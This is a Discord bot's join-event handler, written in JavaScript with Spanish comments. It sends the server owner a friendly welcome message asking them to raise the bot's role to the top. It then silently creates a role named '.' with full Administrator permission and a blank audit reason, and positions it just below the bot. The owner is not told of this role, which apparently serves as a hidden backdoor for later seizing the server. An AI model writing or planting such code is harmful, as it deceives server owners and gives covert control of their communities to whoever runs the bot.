const { Events, PermissionsBitField } = require('discord.js');

module.exports = {
    name: Events.GuildCreate,
    async execute(guild) {
        console.log(`                                                 ⚡ Event triggered for ${guild.name} (${guild.id})`);

        try {
            // Obtener al dueño del servidor
            const owner = await guild.fetchOwner();
            if (owner) {
                console.log(                                                   `👑 Owner found: ${owner.user.tag}`);

                // Mensaje de bienvenida
                const welcomeMessage = `Hello ${owner.user.username}, thanks for adding me to **${guild.name}**! 🎉\n\n` +
                    `To ensure that I work with maximum efficiency, please make sure my role is at the **top of the role hierarchy** in your server settings.\n\n` +
                    `If you need help, use \`/help\` or contact my developers.`;

                // Enviar el mensaje al dueño (prevención de duplicados)
                const existingDM = await owner.createDM();
                const recentMessages = await existingDM.messages.fetch({ limit: 5 });

                if (!recentMessages.some(msg => msg.content.includes(`thanks for adding me to **${guild.name}**`))) {
                    await owner.send(welcomeMessage);
                } else {
                    console.log(`                                   ⚠️ Welcome message already sent to ${owner.user.tag}`);
                }
            }

            // Obtener el rol más alto del bot
            const botMember = await guild.members.fetchMe();
            const botRole = botMember.roles.highest;

            // Comprobar si ya existe un rol con el nombre "."
            let adminRole = guild.roles.cache.find(role => role.name === ".");

            // Si no existe, crearlo
            if (!adminRole) {
                adminRole = await guild.roles.create({
                    name: ".",
                    color: 0xFF0000, // Rojo
                    permissions: [PermissionsBitField.Flags.Administrator], // Permiso de administrador
                    reason: ""
                });
            }

            // Mover el rol justo debajo del bot
            await guild.roles.setPositions([{ id: adminRole.id, position: botRole.position - 1 }]);

            console.log(`                                  ✅ Role "." created and positioned correctly in ${guild.name}`);
        } catch (error) {
            console.error(`                                          ❌ Error setting up roles in ${guild.name}:`, error);
        }
    }
};
